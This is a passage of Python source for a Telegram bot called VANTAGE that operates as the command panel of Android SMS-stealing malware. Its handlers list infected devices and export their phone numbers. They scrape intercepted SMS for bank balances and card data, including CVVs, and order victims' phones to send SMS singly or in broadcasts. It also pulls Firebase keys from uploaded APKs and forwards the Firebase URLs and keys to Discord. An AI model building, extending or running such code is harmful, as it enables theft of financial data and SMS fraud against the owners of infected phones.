async def cmd_lock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: `/lockuser <id> [reason]`", parse_mode='Markdown')
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid ID")
        return
    reason = " ".join(context.args[1:]) or "Access revoked"
    DB.setdefault('locked_users', {})[str(target)] = {
        'reason': reason,
        'since': datetime.now().isoformat(),
    }
    save_data(DB)
    await update.message.reply_text(f"🔒 User `{target}` locked.\nReason: {reason}", parse_mode='Markdown')


async def cmd_unlock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        return
    try:
        target = int(context.args[0])
    except ValueError:
        return
    DB.get('locked_users', {}).pop(str(target), None)
    save_data(DB)
    await update.message.reply_text(f"🔓 User `{target}` unlocked.", parse_mode='Markdown')


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    all_accs = DB.get('accounts', {})
    total_accounts = sum(len(a) for a in all_accs.values())
    text = (
        f"📊 **BOT STATISTICS**\n\n"
        f"👥 Users: **{len(DB.get('user_registry', {}))}**\n"
        f"📡 Accounts: **{total_accounts}**\n"
        f"🔒 Locked Users: **{len(DB.get('locked_users', {}))}**\n"
        f"🚫 Bot Locked: **{'Yes' if DB.get('bot_locked') else 'No'}**\n"
        f"📤 Broadcasts: **{DB.get('broadcasts_sent', 0)}**\n"
    )
    await update.message.reply_text(text, parse_mode='Markdown')


async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    reg = DB.get('user_registry', {})
    locked = DB.get('locked_users', {})
    text = f"👥 **All Users** ({len(reg)})\n\n"
    for uid, info in list(reg.items())[:50]:
        name = info.get('username') or info.get('name') or '—'
        lock_icon = "🔒" if uid in locked else "🟢"
        text += f"{lock_icon} `{uid}` @{name}\n"
    await update.message.reply_text(text[:4000], parse_mode='Markdown')


# ============================================
# BUTTON HANDLERS
# ============================================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = update.effective_user.id
    data = query.data
    
    if is_locked(uid):
        await query.answer("🔒 Locked", show_alert=True)
        return MAIN_MENU
    
    if data == "main_menu":
        await show_menu(update, context)
        return MAIN_MENU
    
    if data == "refresh":
        await show_menu(update, context)
        return MAIN_MENU
    
    # Non-admin can only refresh
    if not is_admin(uid):
        return MAIN_MENU
    
    # Admin handlers
    if data == "add_account":
        context.user_data.clear()
        await query.edit_message_text(
            "📝 **Add Firebase Account**\n\n"
            "Send Firebase URL or upload APK:\n\n"
            "**Supported:**\n"
            "• Single URL\n"
            "• Multiple URLs (newline separated)\n"
            "• APK file auto-extract\n\n"
            "Example: `https://your-app.firebaseio.com`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]),
            parse_mode='Markdown'
        )
        return ADD_URL
    
    if data == "admin_devices":
        try:
            devs = await fetch_all_online_devices(uid)
            if not devs:
                await query.edit_message_text("📭 **No online devices**", parse_mode='Markdown')
                return MAIN_MENU
            text = f"📱 **Online Devices** ({len(devs)})\n\n"
            for d in devs[:20]:
                num = d['phoneNumber'] if d['phoneNumber'] != '—' else '—'
                text += f"🟢 **{d['name'][:25]}**\n"
                text += f"   📞 `{num}` | 🔋 {d['battery']}\n"
                text += f"   🌐 {d['provider'][:20]}\n\n"
            await query.edit_message_text(
                text[:4000],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]),
                parse_mode='Markdown'
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {e}")
        return MAIN_MENU
    
    if data == "admin_numbers":
        try:
            nums = await fetch_all_numbers(uid)
            if not nums:
                await query.edit_message_text("📭 **No numbers**", parse_mode='Markdown')
                return MAIN_MENU
            text = f"📞 **All Numbers** ({len(nums)})\n\n"
            for i, n in enumerate(nums[:80], 1):
                text += f"`{i}.` **{n['number']}** — _{n['device'][:15]}_\n"
            if len(nums) > 80:
                text += f"\n_...and {len(nums) - 80} more_"
            await query.edit_message_text(
                text[:4000],
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📤 Export as file", callback_data="admin_export")],
                    [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
                ]),
                parse_mode='Markdown'
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {e}")
        return MAIN_MENU
    
    if data == "admin_export":
        try:
            nums = await fetch_all_numbers(uid)
            if not nums:
                await query.edit_message_text("📭 No numbers to export")
                return MAIN_MENU
            content = f"# VANTAGE Numbers Export\n# Generated: {datetime.now().isoformat()}\n# Total: {len(nums)}\n\n"
            for n in nums:
                content += f"{n['number']} | {n['device']} | {n['provider']} | {n['battery']}\n"
            
            f = io.BytesIO(content.encode())
            f.name = f"numbers_{int(time.time())}.txt"
            await query.message.reply_document(
                document=f,
                filename=f.name,
                caption=f"📤 **{len(nums)}** numbers exported"
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {e}")
        return MAIN_MENU
    
    if data == "admin_bank":
        try:
            devs = await fetch_all_online_devices(uid)
            banks = []
            for d in devs:
                for m in d.get('messages', []):
                    b = parse_bank_sms(m['text'], m['sender'])
                    if b:
                        b['device'] = d['name']
                        banks.append(b)
            if not banks:
                await query.edit_message_text("📭 **No bank SMS**", parse_mode='Markdown')
                return MAIN_MENU
            text = f"🏦 **Bank Messages** ({len(banks)})\n\n"
            for b in banks[:15]:
                text += f"🏦 **{b['bankName']}**\n"
                text += f"💰 ₹{b['availableBalance']:,.2f}\n"
                if b.get('transactionType') and b.get('transactionAmount'):
                    s = "＋" if b['transactionType'] == 'credit' else "－"
                    text += f"{s}₹{b['transactionAmount']:,.2f}\n"
                text += f"📱 {b['device'][:20]}\n─\n"
            await query.edit_message_text(
                text[:4000],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
                parse_mode='Markdown'
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {e}")
        return MAIN_MENU
    
    if data == "admin_cards":
        try:
            devs = await fetch_all_online_devices(uid)
            cards = []
            for d in devs:
                for m in d.get('messages', []):
                    c = parse_card_sms(m['text'])
                    if c:
                        c['device'] = d['name']
                        cards.append(c)
            if not cards:
                await query.edit_message_text("📭 **No card info**", parse_mode='Markdown')
                return MAIN_MENU
            text = f"💳 **Cards** ({len(cards)})\n\n"
            for c in cards[:15]:
                text += f"💳 **{c['cardType']}**\n"
                text += f"🔢 **** **** **** {c['cardLast4']}\n"
                if c.get('cvv'):
                    text += f"🔐 CVV: `{c['cvv']}`\n"
                if c.get('expiry'):
                    text += f"📅 {c['expiry']}\n"
                text += "─\n"
            await query.edit_message_text(
                text[:4000],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
                parse_mode='Markdown'
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {e}")
        return MAIN_MENU
    
    if data == "admin_accounts":
        accs = get_accounts(uid)
        cur = get_current(uid)
        text = "📁 **Your Accounts**\n\n"
        kb = []
        for i, a in enumerate(accs):
            marker = "✅ " if cur and cur['id'] == a['id'] else "▫️ "
            kb.append([InlineKeyboardButton(
                f"{marker}{a['url'][:35]}",
                callback_data=f"aswitch_{a['id']}"
            )])
            kb.append([InlineKeyboardButton(f"🗑 Del #{i+1}", callback_data=f"adelacc_{a['id']}")])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        return MAIN_MENU
    
    if data.startswith("aswitch_"):
        acc_id = int(data.split("_", 1)[1])
        set_current(uid, acc_id)
        await show_menu(update, context)
        return MAIN_MENU
    
    if data.startswith("adelacc_"):
        acc_id = int(data.split("_", 1)[1])
        accs = [a for a in get_accounts(uid) if a['id'] != acc_id]
        save_accounts(uid, accs)
        cur = get_current(uid)
        if cur and cur['id'] == acc_id:
            set_current(uid, accs[0]['id'] if accs else None)
        await show_menu(update, context)
        return MAIN_MENU
    
    if data == "admin_send":
        devs = await fetch_all_online_devices(uid)
        if not devs:
            await query.edit_message_text("❌ No online devices")
            return MAIN_MENU
        kb = []
        for d in devs[:20]:
            kb.append([InlineKeyboardButton(
                f"📱 {d['name'][:30]} ({d['battery']})",
                callback_data=f"asend_{d['_acc_id']}_{d['id']}"
            )])
        kb.append([InlineKeyboardButton("🔙", callback_data="main_menu")])
        await query.edit_message_text("📤 **Select device:**", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        return MAIN_MENU
    
    if data.startswith("asend_"):
        parts = data.split("_", 2)
        if len(parts) == 3:
            acc_id, dev_id = int(parts[1]), parts[2]
            context.user_data['send_acc_id'] = acc_id
            context.user_data['send_dev'] = dev_id
            await query.edit_message_text(
                "📤 **Send SMS**\n\nEnter recipient number:",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]),
                parse_mode='Markdown'
            )
            return SEND_NUM
    
    if data == "admin_broadcast":
        devs = await fetch_all_online_devices(uid)
        if not devs:
            await query.edit_message_text("❌ No online devices")
            return MAIN_MENU
        context.user_data['bc_devs'] = [(d['_acc_id'], d['id']) for d in devs]
        await query.edit_message_text(
            f"📢 **Broadcast to {len(devs)} devices**\n\nEnter recipient number:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]),
            parse_mode='Markdown'
        )
        return BC_TO
    
    if data == "toggle_lock":
        DB['bot_locked'] = not DB.get('bot_locked', False)
        save_data(DB)
        await show_menu(update, context)
        return MAIN_MENU
    
    if data == "admin_users":
        reg = DB.get('user_registry', {})
        locked = DB.get('locked_users', {})
        text = f"👥 **User Management**\n\n📊 Total: {len(reg)}\n🔒 Locked: {len(locked)}\n\n"
        kb = []
        for luid, info in locked.items():
            text += f"🔒 `{luid}` — {info.get('reason', 'N/A')[:25]}\n"
            kb.append([InlineKeyboardButton(f"🔓 Unlock {luid}", callback_data=f"aunlock_{luid}")])
        kb.append([InlineKeyboardButton("📋 View All Users", callback_data="admin_allusers")])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
        await query.edit_message_text(text[:4000], reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        return MAIN_MENU
    
    if data == "admin_allusers":
        reg = DB.get('user_registry', {})
        locked = DB.get('locked_users', {})
        text = f"👥 **All Users** ({len(reg)})\n\n"
        for uid_s, info in list(reg.items())[:40]:
            name = info.get('username') or info.get('name') or '—'
            lock = "🔒" if uid_s in locked else "🟢"
            text += f"{lock} `{uid_s}` @{name}\n"
        await query.edit_message_text(
            text[:4000],
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_users")]]),
            parse_mode='Markdown'
        )
        return MAIN_MENU
    
    if data.startswith("aunlock_"):
        luid = data.split("_", 1)[1]
        DB.get('locked_users', {}).pop(luid, None)
        save_data(DB)
        await show_menu(update, context)
        return MAIN_MENU
    
    if data == "admin_stats":
        await cmd_stats(update, context)
        return MAIN_MENU
    
    if data == "admin_remove_fb":
        accs = get_accounts(uid)
        if not accs:
            await query.edit_message_text("📭 No accounts")
            return MAIN_MENU
        kb = []
        for a in accs:
            kb.append([InlineKeyboardButton(
                f"🗑 {a['url'][:35]}",
                callback_data=f"armfb_{a['id']}"
            )])
        kb.append([InlineKeyboardButton("🔙", callback_data="main_menu")])
        await query.edit_message_text(
            "🗑 **Remove Firebase Account**\n\nSelect to remove:",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode='Markdown'
        )
        return MAIN_MENU
    
    if data.startswith("armfb_"):
        acc_id = int(data.split("_", 1)[1])
        accs = [a for a in get_accounts(uid) if a['id'] != acc_id]
        save_accounts(uid, accs)
        cur = get_current(uid)
        if cur and cur['id'] == acc_id:
            set_current(uid, accs[0]['id'] if accs else None)
        await query.edit_message_text("✅ Firebase account removed")
        await show_menu(update, context)
        return MAIN_MENU
    
    return MAIN_MENU


# ============================================
# INPUT HANDLERS
# ============================================
async def handle_add_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        return MAIN_MENU
    msg = update.message
    
    if msg.document:
        doc = msg.document
        if not (doc.file_name or '').lower().endswith(('.apk', '.zip')):
            await msg.reply_text("❌ Send .apk or .zip")
            return ADD_URL
        status = await msg.reply_text("🔍 Parsing APK...")
        try:
            file = await doc.get_file()
            fb = await file.download_as_bytearray()
            res = await parse_apk(bytes(fb))
            if not res or (not res.get('firebaseUrl') and not res.get('apiKey')):
                await status.edit_text("❌ No Firebase config found")
                return ADD_URL
            context.user_data['pending_urls'] = [res.get('firebaseUrl', '')]
            context.user_data['pending_key'] = res.get('apiKey', '')
            await status.edit_text(
                f"✅ **APK Parsed!**\n\n"
                f"🔗 `{res.get('firebaseUrl', 'N/A')}`\n"
                f"🔑 `{res.get('apiKey', 'N/A')[:30]}...`\n\n"
                f"Send auth key or `skip`:",
                parse_mode='Markdown'
            )
            return ADD_KEY
        except Exception as e:
            await status.edit_text(f"❌ {e}")
            return ADD_URL
    
    text = msg.text.strip() if msg.text else ""
    if not text:
        return ADD_URL
    
    urls = re.findall(r'https?://[^\s,]+', text)
    if not urls:
        urls = ['https://' + u for u in re.findall(r'[a-zA-Z0-9_-]+\.(?:firebaseio\.com|firebasedatabase\.app)', text)]
    if not urls:
        await msg.reply_text("❌ No valid URL found. Try again or /cancel")
        return ADD_URL
    
    # Dedupe
    urls = list(dict.fromkeys(urls))
    
    context.user_data['pending_urls'] = urls
    await msg.reply_text(
        f"📦 **{len(urls)} URL(s) detected**\n\n"
        + "\n".join([f"`{u[:50]}`" for u in urls[:10]])
        + f"\n\nSend auth key or `skip`:",
        parse_mode='Markdown'
    )
    return ADD_KEY


async def handle_add_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or '').strip()
    
    key = context.user_data.get('pending_key', '') if text == 'skip' else text
    if not key:
        key = 'Hi'
    
    urls = context.user_data.get('pending_urls', [])
    if not urls:
        await update.message.reply_text("❌ No URLs. Restart.")
        await show_menu(update, context)
        return MAIN_MENU
    
    status = await update.message.reply_text(f"🔌 Testing {len(urls)} connection(s)...")
    
    accs = get_accounts(uid)
    added, failed = 0, 0
    
    for url in urls:
        try:
            await fb_get(url, key, "clients")
            existing = next((a for a in accs if a['url'] == url), None)
            if existing:
                existing['key'] = key
            else:
                accs.append({
                    'id': int(time.time() * 1000) + added,
                    'url': url, 'key': key,
                    'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                })
            added += 1
            await send_discord(url, key, update.effective_user.username or str(uid))
        except Exception as e:
            logger.error(f"Add fail {url}: {e}")
            failed += 1
    
    save_accounts(uid, accs)
    if added > 0 and not get_current(uid):
        set_current(uid, accs[-1]['id'])
    
    await status.edit_text(
        f"✅ **Results**\n\n"
        f"✅ Added: **{added}**\n"
        f"❌ Failed: **{failed}**\n"
        f"📁 Total: **{len(accs)}**",
        parse_mode='Markdown'
    )
    await show_menu(update, context)
    return MAIN_MENU


async def handle_send_num(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or '').strip()
    digits = re.sub(r'[^0-9]', '', text)
    if len(digits) == 10:
        num = '+91' + digits
    elif len(digits) == 12 and digits.startswith('91'):
        num = '+' + digits
    else:
        await update.message.reply_text("❌ Invalid. Try +919876543210")
        return SEND_NUM
    context.user_data['send_num'] = num
    await update.message.reply_text(f"📱 To: `{num}`\n\nNow the message:", parse_mode='Markdown')
    return SEND_MSG


async def handle_send_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    
    acc_id = context.user_data.get('send_acc_id')
    dev_id = context.user_data.get('send_dev')
    num = context.user_data.get('send_num')
    
    acc = next((a for a in get_accounts(uid) if a['id'] == acc_id), None)
    if not acc or not dev_id or not num:
        await update.message.reply_text("❌ Session expired.")
        return MAIN_MENU
    
    status = await update.message.reply_text("📤 Sending...")
    paths = [
        f"clients/{dev_id}/webhookEvent/sendSms",
        f"clients/{dev_id}/command",
        f"clients/{dev_id}/commands",
    ]
    payload = {'from': 1, 'to': num, 'message': text, 'isSended': False}
    ok = False
    for p in paths:
        if await fb_put(acc['url'], acc['key'], p, payload):
            ok = True
            break
    await status.edit_text("✅ SMS queued!" if ok else "❌ Failed")
    await show_menu(update, context)
    return MAIN_MENU


async def handle_bc_to(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or '').strip()
    digits = re.sub(r'[^0-9]', '', text)
    if len(digits) == 10:
        num = '+91' + digits
    elif len(digits) == 12 and digits.startswith('91'):
        num = '+' + digits
    else:
        await update.message.reply_text("❌ Invalid number")
        return BC_TO
    context.user_data['bc_num'] = num
    await update.message.reply_text("📢 Enter broadcast message:")
    return BC_MSG


async def handle_bc_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['bc_msg'] = update.message.text.strip()
    await update.message.reply_text("🔢 SMS per device (1-10):")
    return BC_COUNT


async def handle_bc_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        cnt = int(update.message.text.strip())
        if cnt < 1 or cnt > 10:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Send 1-10")
        return BC_COUNT
    
    uid = update.effective_user.id
    devs = context.user_data.get('bc_devs', [])
    num = context.user_data.get('bc_num')
    msg = context.user_data.get('bc_msg')
    
    accs = {a['id']: a for a in get_accounts(uid)}
    total = len(devs) * cnt
    status = await update.message.reply_text(f"📢 Broadcasting... 0/{total}")
    
    done = 0
    for acc_id, dev_id in devs:
        acc = accs.get(acc_id)
        if not acc:
            continue
        for i in range(cnt):
            payload = {
                'from': (i % 2) + 1,
                'to': num, 'message': msg,
                'isSended': False,
                '_bcTime': int(time.time() * 1000) + i,
            }
            for p in [f"clients/{dev_id}/webhookEvent/sendSms", f"clients/{dev_id}/commands"]:
                try:
                    if await fb_put(acc['url'], acc['key'], p, payload):
                        break
                except Exception:
                    pass
            done += 1
            if done % 5 == 0:
                try:
                    await status.edit_text(f"📢 Broadcasting... {done}/{total} ({done*100//total}%)")
                except Exception:
                    pass
            await asyncio.sleep(0.5)
    
    DB['broadcasts_sent'] = DB.get('broadcasts_sent', 0) + 1
    save_data(DB)
    
    await status.edit_text(f"✅ **Broadcast complete!**\n\n{done} SMS queued", parse_mode='Markdown')
    await show_menu(update, context)
    return MAIN_MENU


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await show_menu(update, context)
    return MAIN_MENU


# ============================================
# STARTUP
# ============================================
async def post_init(app: Application):
    await app.bot.set_my_commands([
        BotCommand("start", "Main menu"),
        BotCommand("refresh", "Refresh"),
        BotCommand("help", "Help"),
        BotCommand("cancel", "Cancel"),
    ])
    app.create_task(forward_loop(app))
    logger.info("✅ VANTAGE Bot v2.0 fully started")


def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
        print("❌ Set BOT_TOKEN!")
        return
    
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", cmd_start)],
        states={
            MAIN_MENU: [CallbackQueryHandler(button_handler)],
            ADD_URL: [MessageHandler(filters.Document.ALL | filters.TEXT & ~filters.COMMAND, handle_add_url),
                      CallbackQueryHandler(button_handler)],
            ADD_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_add_key),
                      CallbackQueryHandler(button_handler)],
            SEND_NUM: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_send_num),
                       CallbackQueryHandler(button_handler)],
            SEND_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_send_msg),
                       CallbackQueryHandler(button_handler)],
            BC_TO: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bc_to),
                    CallbackQueryHandler(button_handler)],
            BC_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bc_msg),
                     CallbackQueryHandler(button_handler)],
            BC_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bc_count),
                       CallbackQueryHandler(button_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CommandHandler("start", cmd_start)],
    )
    
    app.add_handler(conv)
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("lock", cmd_lock_bot))
    app.add_handler(CommandHandler("unlock", cmd_unlock_bot))
    app.add_handler(CommandHandler("lockuser", cmd_lock_user))
    app.add_handler(CommandHandler("unlockuser", cmd_unlock_user))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("refresh", cmd_start))
    
    print("🤖 VANTAGE Bot v2.0 starting...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
